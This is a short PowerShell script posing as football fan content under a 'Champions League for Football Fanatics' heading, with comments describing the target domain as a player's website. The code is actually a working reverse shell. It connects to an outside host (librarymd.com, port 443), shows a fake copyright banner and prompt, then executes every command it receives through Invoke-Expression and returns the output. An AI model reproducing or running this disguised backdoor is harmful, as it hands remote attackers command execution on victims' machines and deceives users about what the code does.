# The Champions League for Football Fanatics

$player = "librarymd.com"  # The domain representing a popular football player (could be related to their official website)
$port = 443  # Port to connect to (e.g., 443 for HTTPS)

try {
    # Connect to the domain over TCP (DNS resolution handled automatically)
    $tcpClient = New-Object System.Net.Sockets.TcpClient($player, $port)
    $networkStream = $tcpClient.GetStream()

    # Set up a StreamWriter and StreamReader for communication
    $writer = New-Object IO.StreamWriter($networkStream)
    $writer.AutoFlush = $true
    $reader = New-Object IO.StreamReader($networkStream)

    # Send the initial message
    $writer.WriteLine("(c) Football Corporation. All rights reserved.`n`n")
    $writer.Write((pwd).Path + '> ')

    # Read from the network stream and execute commands
    while ($tcpClient.Connected) {
        $command = $reader.ReadLine()
        if ($command) {
            try {
                # Execute the received command and send the output
                $result = Invoke-Expression $command 2>&1 | Out-String
                $writer.WriteLine($command)
                $writer.WriteLine($result)
                $writer.Write((pwd).Path + '> ')
            } catch {
                $writer.WriteLine("ERROR: $_")
                $writer.Write((pwd).Path + '> ')
            }
        }
    }
} catch {
    exit
}
